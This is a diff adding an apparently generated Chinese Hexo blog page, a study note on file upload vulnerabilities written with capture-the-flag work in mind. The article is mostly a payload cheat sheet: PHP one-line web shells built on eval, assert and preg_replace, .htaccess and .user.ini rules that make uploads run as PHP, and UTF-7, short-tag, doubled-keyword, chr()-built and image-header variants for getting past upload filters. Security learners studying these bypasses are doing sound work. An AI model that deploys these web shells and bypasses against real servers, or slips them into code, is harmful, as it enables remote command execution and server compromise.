@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="qrl-0">
+    
+    
+    
+    
+    
+    
+    <title>文件上传漏洞 | 七里燃</title>
+    <!-- inject:style -->
+    <link href="/myblog/css/style.css" rel="stylesheet" type="text/css">
+    <!-- endinject -->
+    <style>
+        .cube-loading {
+            top: 0;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: url('/myblog/images/lg/loading.gif') no-repeat center center;
+            background-color: rgba(0,0,0,.7);
+        }
+
+        .cube-loading.out {
+            display: none;
+        }
+
+        .cube-loading:before {
+            display: block;
+            content: '加载中';
+            position: relative;
+            width: 100%;
+            top: 50%;
+            right: -50%;
+            color: #fff;
+        }
+
+        @media(max-width: 768px) {
+            .cube-loading:before {
+                font-size: 1.2em;
+                transform: translate(-24px,20px);
+                -webkit-transform: translate(-24px,20px);
+                -o-transform: translate(-24px,20px);
+                -ms-transform: translate(-24px,20px);
+            }
+        }
+
+        @media(min-width: 768px) {
+            .cube-loading:before {
+
+            }
+        }
+    </style>
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+<div class="cube-body">
+    <nav id="cube-top-memu" class="cube-menu">
+    <ul class="cube-menu-collapse">
+        
+        <li>
+            <i class="cube-icon cube-icon-home" aria-hidden="true"></i>
+            <a href="/myblog/">首页</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-archive" aria-hidden="true"></i>
+            <a href="/myblog/archives">归档</a>
+        </li>
+        
+    </ul>
+</nav>
+<nav class="cube-side-menu" id="cube-side-menu">
+    <ul class="cube-menu-list">
+        
+        <li>
+            <a class="lrc-control">开启歌词</a>
+        </li>
+        
+        <li>
+            <a class="scroll-to-top">回到顶部</a>
+        </li>
+    </ul>
+</nav>
+    <header class="cube-header" id="cube-header">
+    <img src=" https://qlr-0.gitee.io/hhhh/background.jpg " alt="头部背景图片">
+    
+    <div class="cube-type">
+        <span class="cube-typed-title">七里燃の部落格</span>
+        <span class="cube-typed-cursor">|</span>
+    </div>
+    
+</header>
+
+    <style>
+        nav.cube-menu:before {
+            content: '';
+            visibility: hidden;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 44px;
+        
+            filter: blur(5px);
+            -webkit-filter: blur(5px);
+        
+            z-index: -1;
+            background-image: url('https://qlr-0.gitee.io/hhhh/background.jpg');
+            background-repeat: no-repeat;
+            background-position: center -356px;
+            background-size: cover;
+            background-color: transparent;
+        }
+
+        header.cube-background.cube-header-background {
+            visibility: hidden;
+            background-image: url('https://qlr-0.gitee.io/hhhh/background.jpg');
+            background-position: center -400px;
+        }
+    </style>
+    <header class="cube-background cube-header-background">
+        
+        <div class="cube-type">
+            <span class="cube-typed-title">七里燃の部落格</span>
+            <span class="cube-typed-cursor">|</span>
+        </div>
+        
+    </header>
+    <div class="load-header-background"></div>
+    <script>
+        (function (window) {
+
+            window.headerModule = {}
+            window.headerModule.image = {
+                width: '2000',
+                height: '1414'
+            }
+
+        })(window)
+    </script>
+    
+    <div class="cube-content">
+        <div class="cube-left">
+            <div class="cube-article">
+    <h1 class="title">文件上传漏洞</h1>
+    
+    <div class="cube-article-header">
+        <div class="cube-article-date">
+            <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+            <!-- moment.js对象 -->
+            2021-03-28
+        </div>
+        <div class="cube-article-tags">
+    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+    
+    <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">#知识点</a>
+    
+</div>
+    </div>
+    
+    <div class="cube-article-content cube-markdown">
+        
+        <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指用户绕过检测，非法上传一个可执行的动态脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</p>
+<p>我们可以利用来执行一句话木马。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[sb])?&gt;</span><br><span class="line">&lt;?php @eval($_POST[sb])?&gt;  #容错代码</span><br><span class="line">&lt;?php assert($_POST[sb]);?&gt; #使用lanker一句话客户端的专家模式执行相关的php语句</span><br><span class="line">&lt;?$_POST[&#39;sa&#39;]($_POST[&#39;sb&#39;]);?&gt;</span><br><span class="line">&lt;?$_POST[&#39;sa&#39;]($_POST[&#39;sb&#39;],$_POST[&#39;sc&#39;])?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@preg_replace(&quot;&#x2F;[email]&#x2F;e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;);</span><br><span class="line">?&gt; #使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入</span><br><span class="line">&lt;O&gt;h&#x3D;@eval($_POST[c]);&lt;&#x2F;O&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[sb])&lt;&#x2F;script&gt;</span><br><span class="line">#绕过&lt;?限制的一句话</span><br></pre></td></tr></table></figure>
+
+<h3 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h3><p>先百度一下，看看什么是.htaccess文件</p>
+<blockquote>
+<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>指令来设置。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/1606637645(1).png"><img src="https://qlr-0.gitee.io/hhhh/tu/1606637645(1).png" alt="1606637645(1)"></a></p>
+<p>当apache服务器在上传点处没有限制用户上传.htaccess文件的时候，并开启了.htaccess功能的时候就会出现漏洞。在上传处对shell文件做了一定上传限制却没有限制上传.htaccess文件的时候，我们可以通过上传.htaccess文件，来重新解析我们所要上传文件的后缀名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里所有后缀.为.aaa的文件都会被视为php文件，当上传成功后我们就可以访问我们所上传的.aaa文件。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/1606638679(1).png"><img src="https://qlr-0.gitee.io/hhhh/tu/1606638679(1).png" alt="1606638679(1)"></a></p>
+<h4 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h4><p>当上传的.htaccess文件被过滤时，可以使用换行绕过的方法绕过过滤。</p>
+<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
+<h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>若apache服务器在上传点处限制用户上传.htaccess文件，我们可以通过上传.user.ini文件来绕过。</p>
+<p>官方解释</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/1606639275(1).png"><img src="https://qlr-0.gitee.io/hhhh/tu/1606639275(1).png" alt="1606639275(1)"></a></p>
+<blockquote>
+<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</p>
+</blockquote>
+<p>利用<code>.user,ini</code>先执行<code>auto_prepend_file</code>函数，<code>auto_prepend_file</code>表示在php程序加载第一个php代码前加载的php文件，也就是先加载了<code>1.aaa</code>里面的文件，即一句话木马。</p>
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>.user.ini</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure>
+
+<h3 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h3><p>若<code>&lt;?php</code> 被被过滤，在php5中就可以使用段标签绕过</p>
+<ul>
+<li>JS风格</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>短标签风格</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ASP风格</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>官方默认风格</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="特殊编码绕过-UTF-7"><a href="#特殊编码绕过-UTF-7" class="headerlink" title="特殊编码绕过(UTF-7)"></a>特殊编码绕过(UTF-7)</h3><p>如果过滤了所有标签形式P，（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>.htaccess</code>解码对应的文件，例如可以使用UTF-7进行绕过。</p>
+<p>编码和解码UTF-7：<a target="_blank" rel="noopener" href="https://www.novel.tools/encode/UTF-7">https://www.novel.tools/encode/UTF-7</a></p>
+<ul>
+<li><p>.htaccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);</code>UTF-7编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure></li>
+<li><p><code>&lt;?php system(&#39;cat /flag&#39;);?&gt;</code>UTF-7编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php</span><br><span class="line">system(&#39;cat &#x2F;flag&#39;)+ADs</span><br><span class="line">?+AD4-</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果对上传文件的内容中的php，POST，eval替换为空，则我们可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h3><p>若对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。</p>
+<p>快速生成指定函数脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;phpinfo&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">	echo &quot;chr(&quot;.ord($a[$i]).&quot;).&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h3><p>可以在文件中加入图片文件头配合解析漏洞</p>
+<h4 id="XMB文件头绕过"><a href="#XMB文件头绕过" class="headerlink" title="XMB文件头绕过"></a>XMB文件头绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure>
+
+<h4 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>练习：后续加上。。。。。。</p>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107165508">https://blog.csdn.net/hxhxhxhxx/article/details/107165508</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.webshell.cc/2265.html">https://www.webshell.cc/2265.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjw-zm/p/11803867.html">https://www.cnblogs.com/wjw-zm/p/11803867.html</a></p>
+
+    </div>
+</div>
+
+<div class="cube-article-nav">
+    <ul>
+        
+        <li class="prev">
+            <a href="/myblog/2021/03/28/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/">
+                <i class="cube-icon cube-prev" aria-hidden="true"></i>
+                弱类型比较
+            </a>
+        </li>
+        
+        
+        <li class="next">
+            <a href="/myblog/2021/03/28/%E6%97%A0%E5%8F%82%E6%95%B0RCE%EF%BC%88%E4%B8%80%EF%BC%89/">
+                无参数RCE（一）
+                <i class="cube-icon cube-next" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+<!-- TODO 根据theme.comment的内容进行入口选择 -->
+
+
+
+        </div>
+        <div class="cube-right">
+            
+
+<div class="cube-search cube-sidebar" id="cube-search">
+    <div class="search-container">
+        <input type="text" placeholder="搜索" class="cube-search-input" id="cube-search-input">
+        <i class="cube-icon cube-icon-search cube-search-submit" aria-hidden="true"></i>
+    </div>
+    <!-- TODO 通过给window赋一个全局变量，通过脚本赋值 -->
+</div>
+<script>
+    (function (window) {
+        'use strict';
+        window.searchModule = {}
+        window.searchModule.JSONUrl = '/myblog/content.json'
+        window.searchModule.rootUrl = '/myblog/'
+    })(window)
+</script>
+<div class="cube-search-form">
+    <div class="cube-search-control">
+        <input type="text" placeholder="搜索" class="search-input">
+        <a class="close-button">
+            <i class="cube-icon cube-close" aria-hidden="true"></i>
+        </a>
+    </div>
+    <div class="cube-search-result"></div>
+</div>
+
+
+<div class="cube-author cube-sidebar" id="cube-author">
+    
+    
+    <span>qrl-0</span>
+    
+    
+    <div class="count">
+        <a class="count articles"><span>11</span>文章</a>
+        <a class="count tags"><span>1</span>标签</a>
+        <a class="count categories"><span>2</span>分类</a>
+    </div>
+</div>
+
+
+
+<div class="cube-music cube-sidebar" id="cube-music">
+    <div class="cube-player aplayer" id="cube-player"></div>
+</div>
+<script>
+    (function (window) {
+        window.musicModule = {}
+        window.musicModule.musicConfig = '{"narrow":false,"autoplay":false,"showlrc":3,"theme":"#b7daff","mutex":true,"mode":"circulation","preload":"auto","listmaxheight":"513px","music":[{"title":"Dear friends","author":"TRIPLANE","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/TRIPLANE - Dear friends.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Dear friends - TRIPLANE.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/TRIPLANE - Dear friends.jpg"},{"title":"Butter-Fly","author":"和田光司","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/和田光司 - Butter-Fly (ピアノヴァージョン).mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Butter-Fly (ピアノヴァージョン) - 和田光司.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/和田光司 - Butter-Fly (ピアノヴァージョン).jpg"},{"title":"宵闇花火","author":"葉月ゆら","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/葉月ゆら - 宵闇花火.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/宵闇花火 - 葉月ゆら.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/葉月ゆら - 宵闇花火.jpg"}]}'
+        window.musicModule.lrcConfig = {
+            open: '开启歌词',
+            close: '关闭歌词'
+        }
+    })(window)
+</script>
+
+
+
+<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
+    <div class="title">
+        <a>近期文章</a>
+    </div>
+    <ul class="list">
+        
+        
+        <li>
+            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
+            
+            <div class="normal">
+                <p class="index first">
+                    <span>1</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/gitee+Hexo%20%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="gitee+Hexo 搭建简单的个人博客">gitee+Hexo 搭建简单的个人博客</a>
+                </p>
+            </div>
+            
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>2</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>3</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="ctf-Crypto常见加解密">ctf-Crypto常见加解密</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>4</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/" title="php反序列化练习">php反序列化练习</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>5</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/%E5%A4%8D%E7%8E%B0-%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86/" title="复现-我TMD烦死了">复现-我TMD烦死了</a>
+                </p>
+            </div>
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-categories cube-sidebar" id="cube-categories">
+    <div class="title">
+        <a href="/myblog/categories">分类</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/categories/%E7%BB%83%E4%B9%A0/">#练习</a>
+        </div>
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/categories/blog/">#blog</a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="cube-tagcloud cube-sidebar" id="cube-tagcloud">
+    <div class="title">
+        <a href="/myblog/tags">标签云</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">#知识点</a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="cube-links cube-sidebar" id="cube-links">
+    <div class="title">
+        <a>个人链接</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            
+            <a href="CHYbeta/Web-Security-Learning" target="_blank">学习</a>
+        </li>
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-friend-links cube-sidebar" id="cube-friend-links">
+    <div class="title">
+        <a>友情链接</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            <!-- TODO change avatar.png to friend.png-->
+            <img src="/myblog/images/friend_links.jpg ">
+            <a href="" target="_blank"></a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+    </div>
+</div>
+<footer class="cube-footer">
+    
+© 2017 qrl-0
+
+<br>
+Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+</footer>
+<!-- inject:script -->
+<script src="/myblog/js/script.js"></script>
+<!-- endinject -->
+<div class="cube-loading out"></div>
+</body>
+</html>
